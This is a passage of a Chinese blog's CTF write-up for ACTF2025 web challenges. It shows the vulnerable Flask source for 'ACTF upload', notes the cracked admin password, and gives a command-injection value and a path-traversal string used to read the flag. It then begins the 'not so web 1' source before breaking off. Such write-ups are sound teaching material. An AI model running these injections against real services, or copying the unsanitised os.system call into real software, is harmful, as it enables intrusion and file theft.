@@ -1,0 +1,874 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en-us">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>ACTF2025 Web Writeup - p0l1st&#39;s blog</title><meta name="author" content="p0l1st">
+<meta name="description" content="ACTF upload 随便登录就是普通用户，进去可以上传文件，然后有任意文件读取，先读/app/app.py得到源码
+"><meta name="keywords" content='CTF, Web安全'>
+  <meta itemprop="name" content="ACTF2025 Web Writeup">
+  <meta itemprop="description" content="ACTF upload 随便登录就是普通用户，进去可以上传文件，然后有任意文件读取，先读/app/app.py得到源码">
+  <meta itemprop="datePublished" content="2025-04-28T09:31:57+00:00">
+  <meta itemprop="dateModified" content="2025-04-28T09:31:57+00:00">
+  <meta itemprop="wordCount" content="1685">
+  <meta itemprop="keywords" content="CTF,Web安全"><meta property="og:url" content="https://p0l1st.github.io/post/actf2025-web-writeup/">
+  <meta property="og:site_name" content="p0l1st&#39;s blog">
+  <meta property="og:title" content="ACTF2025 Web Writeup">
+  <meta property="og:description" content="ACTF upload 随便登录就是普通用户，进去可以上传文件，然后有任意文件读取，先读/app/app.py得到源码">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="post">
+    <meta property="article:published_time" content="2025-04-28T09:31:57+00:00">
+    <meta property="article:modified_time" content="2025-04-28T09:31:57+00:00">
+    <meta property="article:tag" content="CTF">
+    <meta property="article:tag" content="Web安全">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="ACTF2025 Web Writeup">
+  <meta name="twitter:description" content="ACTF upload 随便登录就是普通用户，进去可以上传文件，然后有任意文件读取，先读/app/app.py得到源码">
+<meta name="application-name" content="FixIt">
+<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="https://p0l1st.github.io/post/actf2025-web-writeup/" title="ACTF2025 Web Writeup - p0l1st&#39;s blog" /><link rel="prev" type="text/html" href="https://p0l1st.github.io/post/ctfshow-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="CTFSHOW-Java反序列化" /><link rel="next" type="text/html" href="https://p0l1st.github.io/post/%E7%AC%AC%E4%B8%80%E5%B1%8Aopenharmony-ctf%E4%B8%93%E9%A2%98%E8%B5%9B-web-writeup/" title="第一届OpenHarmony CTF专题赛 Web Writeup" /><link rel="stylesheet" href="/css/config.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "ACTF2025 Web Writeup",
+    "inLanguage": "en-us",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/p0l1st.github.io\/post\/actf2025-web-writeup\/"
+    },"genre": "posts","keywords": "CTF, Web安全","wordcount":  1685 ,
+    "url": "https:\/\/p0l1st.github.io\/post\/actf2025-web-writeup\/","datePublished": "2025-04-28T09:31:57+00:00","dateModified": "2025-04-28T09:31:57+00:00","publisher": {
+      "@type": "Organization",
+      "name": ""},"author": {
+        "@type": "Person",
+        "name": "p0l1st"
+      },"description": ""
+  }
+  </script><script src="/js/head/color-scheme.min.js"></script></head>
+  <body data-instant-intensity="viewport" data-header-desktop="sticky" data-header-mobile="auto"><div class="wrapper" data-page-style="narrow"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="p0l1st&#39;s blog"><span class="header-title-text">p0l1st&#39;s blog</span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a class="menu-link" href="/archives/">Archives</a></li><li class="menu-item">
+              <a class="menu-link" href="/categories/">Categories</a></li><li class="menu-item">
+              <a class="menu-link" href="/tags/">Tags</a></li><li class="menu-item">
+              <a class="menu-link" href="/about/">About</a></li><li class="menu-item">
+              <a class="menu-link" href="/friends/">Friends</a></li><li class="menu-item delimiter"></li><li class="menu-item theme-switch" role="button" aria-label="Switch Theme" title="Switch Theme"><i class="fa-solid fa-adjust" aria-hidden="true"></i></li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="p0l1st&#39;s blog"><span class="header-title-text">p0l1st&#39;s blog</span></a><span class="header-subtitle"></span></div>
+      <div class="theme-switch" role="button" aria-label="Switch Theme"><i class="fa-solid fa-adjust" aria-hidden="true"></i></div>
+      <div class="menu-toggle" id="menu-toggle-mobile" role="button" aria-labelledby="menu-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="menu-item"><a class="menu-link" href="/archives/">Archives</a></li><li class="menu-item"><a class="menu-link" href="/categories/">Categories</a></li><li class="menu-item"><a class="menu-link" href="/tags/">Tags</a></li><li class="menu-item"><a class="menu-link" href="/about/">About</a></li><li class="menu-item"><a class="menu-link" href="/friends/">Friends</a></li><li class="menu-item menu-system"></li>
+      </ul>
+    </nav>
+  </div>
+</header><main class="fi-container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>ACTF2025 Web Writeup</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img class="avatar" src='https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202603311542974.png' alt="p0l1st" height="16" width="16">&nbsp;p0l1st</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/ctf/" class="post-category" title="Category - CTF"><i class="fa-regular fa-folder" aria-hidden="true"></i> CTF</a></span></div><div class="post-meta-line"><span title="published on 2025-04-28 09:31:57"><i class="fa-solid fa-calendar-days me-1" aria-hidden="true"></i><time datetime="2025-04-28">2025-04-28</time></span>&nbsp;<span title="1685 words"><i class="fa-solid fa-pencil-alt me-1" aria-hidden="true"></i>About 1700 words</span>&nbsp;<span><i class="fa-regular fa-clock me-1" aria-hidden="true"></i>8 minutes</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>Contents</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#actf-upload">ACTF upload</a></li>
+    <li><a href="#not-so-web-1">not so web 1</a></li>
+    <li><a href="#not-so-web-2">not so web 2</a></li>
+    <li><a href="#excellent-site">Excellent-Site</a></li>
+    <li><a href="#eznote">eznote</a></li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><h1 class="heading-element" id="actf-upload"><span>ACTF upload</span>
+  <a href="#actf-upload" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h1><p>随便登录就是普通用户，进去可以上传文件，然后有任意文件读取，先读/app/app.py得到源码</p>
+<div class="code-block highlight line-wrapping line-nos-hidden" data-mode="classic" data-copyable="true"><div class="code-header language-python"><span class="code-title"><i class="arrow fa-solid fa-chevron-down" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h" aria-hidden="true"></i></span><span class="action-btn line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers" data-ct-tooltip><i class="fa-solid fa-list-ol" aria-hidden="true"></i></span><span class="action-btn line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap" data-ct-tooltip><i class="fa-solid fa-right-left" aria-hidden="true"></i></span><span class="action-btn copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard" data-copied-text="Copied" data-ct-tooltip><i class="fa-regular fa-clone" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="100" data-line-digit="2" style="--fi-max-shown-lines:100;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">uuid</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">hashlib</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">redirect</span><span class="p">,</span> <span class="n">url_for</span><span class="p">,</span> <span class="n">flash</span><span class="p">,</span> <span class="n">session</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">secret_key</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">getenv</span><span class="p">(</span><span class="s1">&#39;SECRET_KEY&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;username&#39;</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;upload&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;login&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/login&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">,</span> <span class="s1">&#39;GET&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">login</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s1">&#39;POST&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">username</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">password</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">username</span> <span class="o">==</span> <span class="s1">&#39;admin&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha256</span><span class="p">(</span><span class="n">password</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span> <span class="o">==</span> <span class="s1">&#39;32783cef30bc23d9549623aa48aa8556346d78bd3ca604f277d63d6e573e8ce0&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">session</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">username</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;index&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">flash</span><span class="p">(</span><span class="s1">&#39;Invalid password&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">session</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">username</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;index&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">        &lt;h1&gt;Login&lt;/h1&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">        &lt;h2&gt;No need to register.&lt;/h2&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">        &lt;form action=&#34;/login&#34; method=&#34;post&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">            &lt;label for=&#34;username&#34;&gt;Username:&lt;/label&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">            &lt;input type=&#34;text&#34; id=&#34;username&#34; name=&#34;username&#34; required&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">            &lt;br&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">            &lt;label for=&#34;password&#34;&gt;Password:&lt;/label&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">            &lt;input type=&#34;password&#34; id=&#34;password&#34; name=&#34;password&#34; required&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">            &lt;br&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">            &lt;input type=&#34;submit&#34; value=&#34;Login&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">        &lt;/form&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">        &#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/upload&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">,</span> <span class="s1">&#39;GET&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">upload</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;username&#39;</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;login&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s1">&#39;POST&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">f</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">files</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">file_path</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">uuid</span><span class="o">.</span><span class="n">uuid4</span><span class="p">())</span> <span class="o">+</span> <span class="s1">&#39;_&#39;</span> <span class="o">+</span> <span class="n">f</span><span class="o">.</span><span class="n">filename</span>
+</span></span><span class="line"><span class="cl">        <span class="n">f</span><span class="o">.</span><span class="n">save</span><span class="p">(</span><span class="s1">&#39;./uploads/&#39;</span> <span class="o">+</span> <span class="n">file_path</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;/upload?file_path=</span><span class="si">{</span><span class="n">file_path</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;file_path&#39;</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">            &lt;h1&gt;Upload Image&lt;/h1&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">            
+</span></span></span><span class="line"><span class="cl"><span class="s1">            &lt;form action=&#34;/upload&#34; method=&#34;post&#34; enctype=&#34;multipart/form-data&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                &lt;input type=&#34;file&#34; name=&#34;file&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                &lt;input type=&#34;submit&#34; value=&#34;Upload&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">            &lt;/form&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">            &#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">            
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">file_path</span> <span class="o">=</span> <span class="s1">&#39;./uploads/&#39;</span> <span class="o">+</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;file_path&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;username&#39;</span><span class="p">)</span> <span class="o">!=</span> <span class="s1">&#39;admin&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">file_path</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">content</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">b64</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">return</span> <span class="sa">f</span><span class="s1">&#39;&lt;img src=&#34;data:image/png;base64,</span><span class="si">{</span><span class="n">b64</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="si">}</span><span class="s1">&#34; alt=&#34;Uploaded Image&#34;&gt;&#39;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;base64 </span><span class="si">{</span><span class="n">file_path</span><span class="si">}</span><span class="s1"> &gt; /tmp/</span><span class="si">{</span><span class="n">file_path</span><span class="si">}</span><span class="s1">.b64&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="c1"># with open(f&#39;/tmp/{file_path}.b64&#39;, &#39;r&#39;) as f:</span>
+</span></span><span class="line"><span class="cl">                <span class="c1">#     return f&#39;&lt;img src=&#34;data:image/png;base64,{f.read()}&#34; alt=&#34;Uploaded Image&#34;&gt;&#39;</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="s1">&#39;Sorry, but you are not allowed to view this image.&#39;</span>
+</span></span><span class="line"><span class="cl">                
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">5000</span><span class="p">)</span></span></span></code></pre></div></div><p>可以看到<code>upload</code>路由这里如果是admin的话会执行<code>os.system(f'base64 {file_path} &gt; /tmp/{file_path}.b64')</code>，存在命令注入,admin的密码解出是backdoor</p>
+<p><img loading="lazy" src='https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202504272310712.png' alt="image-20250427131641901"></p>
+<p>那么就可以通过命令注入获取flag名称/Fl4g_is_H3r3，再通过任意文件读取去读flag</p>
+<pre tabindex="0"><code>file_path=; ls / &gt; /tmp/aaa #
+file_path=../../../../Fl4g_is_H3r3</code></pre><h1 class="heading-element" id="not-so-web-1"><span>not so web 1</span>
+  <a href="#not-so-web-1" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h1><div class="code-block highlight line-wrapping line-nos-hidden" data-mode="classic" data-copyable="true"><div class="code-header language-python"><span class="code-title"><i class="arrow fa-solid fa-chevron-down" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h" aria-hidden="true"></i></span><span class="action-btn line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers" data-ct-tooltip><i class="fa-solid fa-list-ol" aria-hidden="true"></i></span><span class="action-btn line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap" data-ct-tooltip><i class="fa-solid fa-right-left" aria-hidden="true"></i></span><span class="action-btn copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard" data-copied-text="Copied" data-ct-tooltip><i class="fa-regular fa-clone" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="100" data-line-digit="3" style="--fi-max-shown-lines:100;--fi-line-digit:3;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span><span class="o">,</span> <span class="nn">json</span><span class="o">,</span> <span class="nn">time</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span><span class="o">,</span> <span class="nn">sys</span><span class="o">,</span> <span class="nn">binascii</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">dataclasses</span> <span class="kn">import</span> <span class="n">dataclass</span><span class="p">,</span> <span class="n">asdict</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">typing</span> <span class="kn">import</span> <span class="n">Dict</span><span class="p">,</span> <span class="n">Tuple</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">secret</span> <span class="kn">import</span> <span class="n">KEY</span><span class="p">,</span> <span class="n">ADMIN_PASSWORD</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Util.Padding</span> <span class="kn">import</span> <span class="n">pad</span><span class="p">,</span> <span class="n">unpad</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Flask</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">render_template</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">render_template_string</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">request</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">redirect</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">url_for</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">flash</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">session</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">secret_key</span> <span class="o">=</span> <span class="n">KEY</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@dataclass</span><span class="p">(</span><span class="n">kw_only</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">APPUser</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">name</span><span class="p">:</span> <span class="nb">str</span>
+</span></span><span class="line"><span class="cl">    <span class="n">password_raw</span><span class="p">:</span> <span class="nb">str</span>
+</span></span><span class="line"><span class="cl">    <span class="n">register_time</span><span class="p">:</span> <span class="nb">int</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#  In-memory store for user registration</span>
+</span></span><span class="line"><span class="cl"><span class="n">users</span><span class="p">:</span> <span class="n">Dict</span><span class="p">[</span><span class="nb">str</span><span class="p">,</span> <span class="n">APPUser</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;admin&#34;</span><span class="p">:</span> <span class="n">APPUser</span><span class="p">(</span><span class="n">name</span><span class="o">=</span><span class="s2">&#34;admin&#34;</span><span class="p">,</span> <span class="n">password_raw</span><span class="o">=</span><span class="n">ADMIN_PASSWORD</span><span class="p">,</span> <span class="n">register_time</span><span class="o">=-</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">validate_cookie</span><span class="p">(</span><span class="n">cookie</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bool</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">cookie</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
